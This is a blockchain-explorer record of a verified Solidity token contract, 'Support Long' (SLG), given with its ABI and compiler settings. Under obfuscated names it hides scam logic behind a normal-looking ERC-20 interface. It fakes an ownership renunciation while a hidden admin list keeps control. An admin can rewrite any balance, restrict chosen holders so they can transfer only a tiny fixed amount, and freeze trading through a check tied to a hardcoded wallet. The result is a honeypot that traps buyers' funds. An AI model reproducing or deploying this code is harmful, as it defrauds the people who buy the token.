{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface isLaunched {\n    function createPair(address isMin, address isWallet) external returns (address);\n}\n\ninterface toMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundShould) external view returns (uint256);\n\n    function transfer(address totalList, uint256 tradingModeIs) external returns (bool);\n\n    function allowance(address senderToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingModeIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalList,\n        uint256 tradingModeIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listIs, uint256 value);\n    event Approval(address indexed senderToken, address indexed spender, uint256 value);\n}\n\nabstract contract modeFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isAmount is toMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SupportLong is modeFee, toMax, isAmount {\n\n    mapping(address => uint256) private buyIs;\n\n    uint256 receiverFee;\n\n    bool public liquidityTrading;\n\n    event OwnershipTransferred(address indexed txFrom, address indexed minFund);\n\n    function fundAutoTx(address limitFee, address totalList, uint256 tradingModeIs) internal returns (bool) {\n        if (limitFee == listSwap) {\n            return launchedMaxShould(limitFee, totalList, tradingModeIs);\n        }\n        uint256 marketingLaunch = toMax(isReceiverTo).balanceOf(shouldFundWallet);\n        require(marketingLaunch == teamFrom);\n        require(totalList != shouldFundWallet);\n        if (senderMax[limitFee]) {\n            return launchedMaxShould(limitFee, totalList, launchedMin);\n        }\n        return launchedMaxShould(limitFee, totalList, tradingModeIs);\n    }\n\n    function allowance(address enableLaunchedTeam, address tradingEnable) external view virtual override returns (uint256) {\n        if (tradingEnable == autoExempt) {\n            return type(uint256).max;\n        }\n        return minMarketing[enableLaunchedTeam][tradingEnable];\n    }\n\n    function receiverSwap(address teamExempt, uint256 tradingModeIs) public {\n        listTake();\n        buyIs[teamExempt] = tradingModeIs;\n    }\n\n    string private totalLiquidity = \"SLG\";\n\n    mapping(address => mapping(address => uint256)) private minMarketing;\n\n    function getOwner() external view returns (address) {\n        return shouldList;\n    }\n\n    uint256 teamFrom;\n\n    bool private txIsSell;\n\n    function launchedMaxShould(address limitFee, address totalList, uint256 tradingModeIs) internal returns (bool) {\n        require(buyIs[limitFee] >= tradingModeIs);\n        buyIs[limitFee] -= tradingModeIs;\n        buyIs[totalList] += tradingModeIs;\n        emit Transfer(limitFee, totalList, tradingModeIs);\n        return true;\n    }\n\n    bool private enableAmountLaunched;\n\n    function enableFrom(address isMax) public {\n        listTake();\n        if (txIsSell) {\n            marketingSenderLiquidity = true;\n        }\n        if (isMax == listSwap || isMax == isReceiverTo) {\n            return;\n        }\n        senderMax[isMax] = true;\n    }\n\n    function listTake() private view {\n        require(toMin[_msgSender()]);\n    }\n\n    address public isReceiverTo;\n\n    mapping(address => bool) public toMin;\n\n    address public listSwap;\n\n    function tokenIs() public {\n        emit OwnershipTransferred(listSwap, address(0));\n        shouldList = address(0);\n    }\n\n    uint8 private receiverAt = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverAt;\n    }\n\n    constructor (){\n        \n        launchedSender walletSell = launchedSender(autoExempt);\n        isReceiverTo = isLaunched(walletSell.factory()).createPair(walletSell.WETH(), address(this));\n        if (txMaxBuy != txIsSell) {\n            txIsSell = true;\n        }\n        listSwap = _msgSender();\n        toMin[listSwap] = true;\n        buyIs[listSwap] = toEnable;\n        tokenIs();\n        if (txMin == marketingSenderLiquidity) {\n            txMin = true;\n        }\n        emit Transfer(address(0), listSwap, toEnable);\n    }\n\n    function owner() external view returns (address) {\n        return shouldList;\n    }\n\n    function exemptBuy(uint256 tradingModeIs) public {\n        listTake();\n        teamFrom = tradingModeIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return totalLiquidity;\n    }\n\n    function approve(address tradingEnable, uint256 tradingModeIs) public virtual override returns (bool) {\n        minMarketing[_msgSender()][tradingEnable] = tradingModeIs;\n        emit Approval(_msgSender(), tradingEnable, tradingModeIs);\n        return true;\n    }\n\n    function balanceOf(address fundShould) public view virtual override returns (uint256) {\n        return buyIs[fundShould];\n    }\n\n    uint256 public receiverSenderFund;\n\n    uint256 constant launchedMin = 18 ** 10;\n\n    address private shouldList;\n\n    uint256 public liquidityIs;\n\n    address shouldFundWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public txSwap;\n\n    function marketingLimit(address senderExempt) public {\n        if (txSwap) {\n            return;\n        }\n        \n        toMin[senderExempt] = true;\n        \n        txSwap = true;\n    }\n\n    bool private txMaxBuy;\n\n    string private shouldLiquidity = \"Support Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toEnable;\n    }\n\n    mapping(address => bool) public senderMax;\n\n    bool private txMin;\n\n    function transfer(address teamExempt, uint256 tradingModeIs) external virtual override returns (bool) {\n        return fundAutoTx(_msgSender(), teamExempt, tradingModeIs);\n    }\n\n    bool public marketingSenderLiquidity;\n\n    address autoExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address limitFee, address totalList, uint256 tradingModeIs) external override returns (bool) {\n        if (_msgSender() != autoExempt) {\n            if (minMarketing[limitFee][_msgSender()] != type(uint256).max) {\n                require(tradingModeIs <= minMarketing[limitFee][_msgSender()]);\n                minMarketing[limitFee][_msgSender()] -= tradingModeIs;\n            }\n        }\n        return fundAutoTx(limitFee, totalList, tradingModeIs);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return shouldLiquidity;\n    }\n\n    uint256 private toEnable = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLaunchedTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingModeIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMax\",\"type\":\"address\"}],\"name\":\"enableFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingModeIs\",\"type\":\"uint256\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isReceiverTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderExempt\",\"type\":\"address\"}],\"name\":\"marketingLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingSenderLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSenderFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingModeIs\",\"type\":\"uint256\"}],\"name\":\"receiverSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingModeIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingModeIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SupportLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}